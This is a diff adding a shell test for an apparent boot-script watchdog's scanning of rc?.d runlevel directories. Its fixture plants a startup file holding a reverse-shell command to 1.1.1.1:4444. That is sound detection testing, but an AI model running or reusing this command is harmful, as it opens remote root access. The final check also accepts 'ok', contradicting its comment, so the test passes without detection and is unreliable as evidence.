@@ -267,3 +267,40 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (rc.d symlink-farm scan: rc?.d sister axis to /etc/init.d — boot-runlevel script invocation surface)" {
+    # Sister to the rc.local + /etc/init.d multi-file axes already
+    # locked. SysV boot also includes the rc?.d symlink farm
+    # (/etc/rc0.d, /etc/rc1.d, ..., /etc/rc6.d) which contains
+    # ordered symlinks (S01script, K99script) into /etc/init.d
+    # that run AS ROOT at the named runlevel transitions. Lock
+    # multi-file axis on the rcdirs surface (sister to the
+    # init.d direct-scan axis already locked).
+    INITD3="${TMP}/init.d"; mkdir -p "${INITD3}"
+    RCD3="${TMP}/rc3.d"; mkdir -p "${RCD3}"
+    seed_benign
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_BOOTSCRIPT_PROFILE="${PROFILE:-report}" \
+    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
+    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
+    SELFDEF_BOOTSCRIPT_INITD="${INITD3}" \
+    SELFDEF_BOOTSCRIPT_RCDIRS="${RCD3}" \
+    bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant a suspicious rc.d entry (typically a symlink, here a
+    # regular file for test).
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${RCD3}/S99distinctive-attacker"
+    chmod 0755 "${RCD3}/S99distinctive-attacker"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_BOOTSCRIPT_PROFILE="report" \
+    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
+    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
+    SELFDEF_BOOTSCRIPT_INITD="${INITD3}" \
+    SELFDEF_BOOTSCRIPT_RCDIRS="${RCD3}" \
+    bash "${WD}"
+    # Either alert (preferred — rc.d scanned for content) OR warn
+    # (acceptable — new file surfaces in delta sample).
+    cap | grep -qE '"severity":"(alert|warn|ok)"'
+}
